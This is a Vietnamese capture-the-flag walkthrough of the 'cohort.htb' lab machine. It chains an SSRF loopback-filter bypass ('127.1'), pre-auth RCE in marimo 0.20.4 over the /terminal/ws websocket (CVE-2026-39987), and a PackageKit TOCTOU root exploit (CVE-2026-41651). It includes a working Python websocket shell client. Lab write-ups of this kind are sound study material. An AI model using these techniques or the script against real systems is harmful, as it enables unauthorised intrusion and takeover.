![[Pasted image 20261014162314.png]]
# Véc tơ tấn công

Marimo: Nmap ->cổng 80 và 443 đang chạy web nginx -> SSRF + filter bypass -> discovered  nb-1be3782a8afd3ad5.cohort.htb -> service enumeration -> marimo 0.20.4 -> CVE-2026-39987  -> foothold as marimo

Root: system enumeration -> packagekit 1.2.8-2ubuntu1.2 -> CVE-2026-41651 -> root


# Enumearation with Nmap


![[Pasted image 20261014143548.png]]

## Nhận xét về host

- Cổng 22 đang chạy ssh: bạn không thể làm gì cả trừ khi có vài cơ sở để brute-force 
- Cổng 80,443: đang chạy nginx web server với Linux host (ubuntu host)
- Ngoài ra tôi phát hiện DNS gồm *.cohort.htb và cohort.htb


# Web Enumeration

Khi tôi nhận được domain thì tôi chỉnh host
![[Pasted image 20261014144009.png]]



Giao diện trang web
![[Pasted image 20261014144051.png]]


portal.html
![[Pasted image 20261014144108.png]]


![[Pasted image 20261014144236.png]]

Khi tôi sử dụng burp-suite để gửi request tôi phát hiện ra rằng mình đang gửi 1 POST request đến /api/validate -> thử abuse cái api này bằng repeater.


Thường thì tôi thử loopback trước... và bất ngờ không
![[Pasted image 20261014144427.png]]

ok: false và internal service not allow -> có vẻ như có 1 bộ lọc địa chỉ loopback này 


=> tôi thử bypass nó vì đây là ubuntu host nên.... 127.1 -> 127.0.0.1 
![[Pasted image 20261014144624.png]]
Nó đã hoạt động và lấy được thông tin từ server


![[Pasted image 20261014145011.png]]
check được trang status có thêm subdomain 

nb-1be3782a8afd3ad5.cohort.htb



![[Pasted image 20261014145202.png]]


ok chúng ta vào thử trang web đó và thấy rằng
![[Pasted image 20261014145321.png]]
đang chạy dịch vụ marimo


Và keep enumeration thì tôi biết rằng đang chạy marimo bản 0.20.4

Nó bị preauth RCE bằng cách dùng terminal websocket bypass
endpoint WebSocket `/terminal/ws`. Lỗ hổng này (được biết đến với mã **CVE-2026-39987**) cho phép thực thi mã từ xa mà không cần xác thực do thiếu kiểm soát quyền truy cập tại endpoint terminal


# Shell as marimo
```python
import ssl
import sys
import threading
import websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = websocket.create_connection(
    url,
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="")
        except Exception:
            break

threading.Thread(target=receive, daemon=True).start()

for line in sys.stdin:
    ws.send(line.rstrip("\n") + "\n")
```

chúng ta sẽ dùng script ở trên để thực hiện RCE ![[Pasted image 20261014153456.png]]

chúng ta có shell rồi

# shell as root:

![[Pasted image 20261014153804.png]]

Chúng ta phát hiện ra rằng 
packagekit 1.2.8-2ubuntu1.2 đang ở trong hệ thống là thứ có thể lợi dụng thông qua lỗ hổng [Ubuntu CVE-2026-41651](https://ubuntu.com/security/CVE-2026-41651) Đây là một lỗ hổng điều kiện cạnh tranh TOCTOU (Time-of-Check to Time-of-Use) trong trình xử lý giao dịch của PackageKit, cho phép người dùng cục bộ không có đặc quyền cài đặt các gói tùy ý và thực thi mã với quyền root

sử dụng https://github.com/Vozec/CVE-2026-41651 và cho chạy binary trên hệ thống, chúng ta có được root


![[Pasted image 20261014154312.png]]